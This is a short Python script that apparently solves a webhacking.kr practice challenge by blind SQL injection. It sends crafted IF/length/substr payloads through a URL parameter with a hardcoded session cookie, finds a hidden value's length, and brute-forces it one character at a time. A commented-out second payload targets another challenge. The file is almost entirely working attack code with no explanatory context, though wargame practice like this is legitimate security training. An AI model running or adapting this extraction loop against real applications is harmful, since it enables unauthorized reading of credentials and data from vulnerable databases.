import requests
import string
import time

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)


URL = "https://webhacking.kr/challenge/web-09/index.php?no="
SESSION_ID = "hcfq0uh9kik6ivdlgl6eblf2md"
cookies = {'PHPSESSID':SESSION_ID}

password = ""
# find the length of the password
for i in range(1, 100):
    payload = f"IF(length(id)like({i}),1,2)"
    # print(f"{i}: {payload}")
    before = time.time()
    response = requests.get(URL+payload, cookies=cookies)
    print(i)
    # print(response.text)
    if "Apple" in response.text:
        break

length = i
print(f"Length: {length}")
while len(password) < length:    
    for c in string.printable:
        payload = f"IF(substr(id,1,{len(password)+1})like(0x{string_to_hex(c)}),1,2)"
        print(f"{c}: {payload}")
        # print(c)
        response = requests.get(URL+payload, cookies=cookies)
        if "Apple" in response.text:
            i += 1
            password += c
            print(password)
            break
    

# ?score=770%20or%20left(id,4)like(0x61646D69)#6E)"
# url_res = "https://webhacking.kr/challenge/web-31/rank.php"
# params = {'score':'1'}
# response = requests.get(url_res, params=params, cookies=cookies)
# print(response.text)
